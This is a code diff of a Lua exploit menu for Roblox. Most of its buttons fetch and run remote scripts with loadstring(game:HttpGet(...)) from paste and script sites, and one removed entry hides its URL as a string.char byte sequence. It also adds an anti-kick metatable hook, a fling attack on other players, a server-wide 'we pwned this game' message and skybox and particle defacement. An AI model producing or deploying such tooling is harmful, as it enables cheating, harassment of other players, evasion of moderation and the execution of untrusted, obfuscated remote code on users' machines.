+    {"Prizz Admin", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-Prizz-Admin-14511"))() end},
+    {"Private Chat", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-a-secretive-Fe-chat-for-communication-without-filtering-49526"))() end},
+    {"R6 Animations GUI", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/aqua-hub-is-a-skid-lol/refs/heads/main/animatrix"))() end},
+    {"RC7", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rc7-29631"))() end},
+    {"Remote-Abuse Admin", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-remote-abuse-FE-admin-script-27923"))() end},
+    {"RemoteSpy V3", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-RemoteSpy-v3-33731"))() end},
+    {"Retro Animations R6", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Classic-Animations-2971"))() end},
+    {"Roblox Emotes & Animations", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024"))() end},
+    {"SaveInstance V2", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universally-saveinstance-V2-42081"))() end},
+    {"Secret Service Panel", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Secret-Service-panel-9623"))() end},
+    {"Security Cameras", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FNAF-Inspired-Camera-Script-17367"))() end},
+    {"ServerHint Message", function()
+        local h = Instance.new("Hint", workspace)
+        h.Text = "BOW DOWN TO NAS9229ALT & HAXSTER998 CUZ WE PWNED THIS GAME LOL"
+    end},
+    {"Set Particles", function()
+        for _, v in pairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local p = Instance.new("ParticleEmitter", v)
+                p.Texture = "rbxassetid://82411403129832"
+            end
+        end
+    end},
+    {"Set Skybox", function()
+        local id = "rbxassetid://82411403129832"
+        local s = Instance.new("Sky", game.Lighting)
+        s.SkyboxBk = id
+        s.SkyboxDn = id
+        s.SkyboxFt = id
+        s.SkyboxLf = id
+        s.SkyboxRt = id
+        s.SkyboxUp = id
+    end},
+    {"SimpleSpy", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SimpleSpy-20145"))() end},
+    {"Sirius", function() loadstring(game:HttpGet('https://sirius.menu/sirius'))() end},
+    {"Skeleton Skybox", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Skeleton-skybox-53658"))() end},
+    {"Skrubl0rdz Skybox", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lkidd-skybox-script-10964"))() end},
+    {"Spin Skybox", function()
+        local lighting = game:GetService("Lighting")
+        local sky = lighting:FindFirstChildOfClass("Sky")
+        if not sky then warn("Sky object not found under Lighting") return end
+        local speed = 360 * 1000000
+        RunService.RenderStepped:Connect(function(dt)
+            local current = sky.SkyboxOrientation
+            local newX = (current.X + speed * dt) % 360
+            sky.SkyboxOrientation = Vector3.new(newX, current.Y, current.Z)
+        end)
+    end},
+    {"T0PK3K 5.0", function() loadstring(game:HttpGet("https://gist.githubusercontent.com/nosyliam/3a0464974205a93d31b9f188ace47a53/raw/983b37288a04ce048b9a8cde36fefa0b7564691a/tksrc.lua"))() end},
+    {"Universal Anti-Kick (FE)", function()
+        local mt = getrawmetatable(game)
+        local oldNamecall = mt.__namecall
+        setreadonly(mt, false)
+        mt.__namecall = newcclosure(function(self, ...)
+            local args = {...}
+            local method = getnamecallmethod()
+            if method == "Kick" and self == game.Players.LocalPlayer then
+                warn("Blocked a kick attempt!")
+                return
+            end
+            return oldNamecall(self, ...)
+        end)
+        setreadonly(mt, true)
+        if LocalPlayer.Character then
+            LocalPlayer.Character:GetPropertyChangedSignal("Parent"):Connect(function()
+                if not LocalPlayer.Character.Parent then
+                    warn("Attempted to remove character! Re-parenting...")
+                    LocalPlayer.Character.Parent = workspace
+                end
+            end)
+        end
+    end},
+    {"VC Unbanner", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Voice-Chat-Unban-42843"))() end},
+    {"Void Disabler", function()
+        local VOID_HEIGHT = -math.huge
+        game:GetService("RunService").Heartbeat:Connect(function()
+            for _, player in ipairs(game.Players:GetPlayers()) do
+                local char = player.Character
+                local root = char and char:FindFirstChild("HumanoidRootPart")
+                if root and root.Position.Y < VOID_HEIGHT then
+                    root.Velocity = Vector3.zero
+                    root.CFrame = CFrame.new(root.Position.X, 10, root.Position.Z)
+                end
+            end
+        end)
+    end},
+    {"Wait They Don't Love You Dance", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Wait-They-Dont-Love-You-Like-I-Love-You-Animation-Dance-24631"))() end},
+    {"Walk On Walls", function() loadstring(game:HttpGet("https://rawscripts.net/raw/FE-walk-on-walls_206"))() end}
 }
+
+-- Sort alphabetically (case-insensitive)
+table.sort(buttons, function(a, b)
+    return a[1]:lower() < b[1]:lower()
+end)
 
 for _, item in ipairs(buttons) do
     createButton(scrollMain, item[1], item[2])
 end
 
--- Executor tab
+-- Executor tab (unchanged)
 local inputBox = Instance.new("TextBox", containerExec)
 inputBox.Size = UDim2.new(1, 0, 0.7, 0)
 inputBox.Position = UDim2.new(0, 0, 0, 0)
@@ -922,7 +969,7 @@ execButton.MouseButton1Click:Connect(function()
     end)
 end)
 
--- Misc tab - Clean, consistent style
+-- Misc tab - Now only the player & amount sections
 local scrollMisc = Instance.new("ScrollingFrame", containerMisc)
 scrollMisc.Size = UDim2.new(1, -20, 1, -20)
 scrollMisc.Position = UDim2.new(0, 10, 0, 10)
@@ -954,7 +1001,7 @@ end
 -- Player Target Section
 local playerInput = Instance.new("TextBox", scrollMisc)
 playerInput.Size = UDim2.new(1, -20, 0, 40)
-playerInput.PlaceholderText = "Enter Player Name"
+playerInput.PlaceholderText = "Enter Player Name (partial OK)"
 playerInput.Text = ""
 playerInput.Font = Enum.Font.Gotham
 playerInput.TextSize = 14
@@ -989,13 +1036,11 @@ createPlayerButton("Bang Player", function(target)
     local hum = char:FindFirstChild("Humanoid")
     if not hrp or not hum then return end
 
-    -- Simple FE bang animation + fling
     local anim = Instance.new("Animation")
-    anim.AnimationId = "rbxassetid://148840487"  -- Classic bang animation
+    anim.AnimationId = "rbxassetid://148840487"
     local track = hum:LoadAnimation(anim)
     track:Play()
 
-    -- Attach to local player and fling
     local att0 = Instance.new("Attachment", LocalPlayer.Character.HumanoidRootPart)
     local att1 = Instance.new("Attachment", hrp)
     local alignPos = Instance.new("AlignPosition")
@@ -1101,54 +1146,6 @@ end)
 createAmountButton("Set Gravity", function(val)
     workspace.Gravity = val
 end)
-
--- Small spacer
-local spacer2 = Instance.new("Frame", scrollMisc)
-spacer2.Size = UDim2.new(1, 0, 0, 15)
-spacer2.BackgroundTransparency = 1
-
--- Remaining buttons (same style as normal buttons)
-createButton(scrollMisc, "Grab Knife V4", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-Knife-V4-56561"))() end)
-createButton(scrollMisc, "[Ancient] NasGUI V1.0", function() loadstring(game:HttpGet("https://pastefy.app/P7a8Lj5Y/raw"))() end)
-createButton(scrollMisc, "NasGUI V1.6 Reborn", function()
-    local u = string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,111,79,71,76,73,85,90,69,47,114,97,119)
-    loadstring(game:HttpGet(u))()
-end)
-createButton(scrollMisc, "Anti-AFK", function()
-    local VirtualUser = game:GetService("VirtualUser")
-    game:GetService("Players").LocalPlayer.Idled:Connect(function()
-        VirtualUser:CaptureController()
-        VirtualUser:ClickButton2(Vector2.new())
-    end)
-end)
-createButton(scrollMisc, "NasGUI Reborn V1.7.6", function()
-    loadstring(game:HttpGet("https://pastefy.app/PSwknTJR/raw?part=NasGUI-v1.7.6_REBORN.lua"))()
-end)
-createButton(scrollMisc, "Clone Yourself", function()
-    local plr = LocalPlayer
-    if plr and plr.Character then
-        local clone = plr.Character:Clone()
-        clone.Parent = workspace
-        clone:SetPrimaryPartCFrame(plr.Character:GetPrimaryPartCFrame() + Vector3.new(3,0,0))
-    end
-end)
-createButton(scrollMisc, "Void Disabler", function()
-    local VOID_HEIGHT = -math.huge
-    game:GetService("RunService").Heartbeat:Connect(function()
-        for _, player in ipairs(game.Players:GetPlayers()) do
-            local char = player.Character
-            local root = char and char:FindFirstChild("HumanoidRootPart")
-            if root and root.Position.Y < VOID_HEIGHT then
-                root.Velocity = Vector3.zero
-                root.CFrame = CFrame.new(root.Position.X, 10, root.Position.Z)
-            end
-        end
-    end)
-end)
-createButton(scrollMisc, "Walk On Walls", function() loadstring(game:HttpGet("https://rawscripts.net/raw/FE-walk-on-walls_206"))() end)
-createButton(scrollMisc, "Security Cameras", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FNAF-Inspired-Camera-Script-17367"))() end)
-createButton(scrollMisc, "RC7", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rc7-29631"))() end)
-createButton(scrollMisc, "Fly GUI v3", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Gui-V3-Turkish-48460"))() end)
 
 -- Executor detection notification
 local executorName = "Unknown"
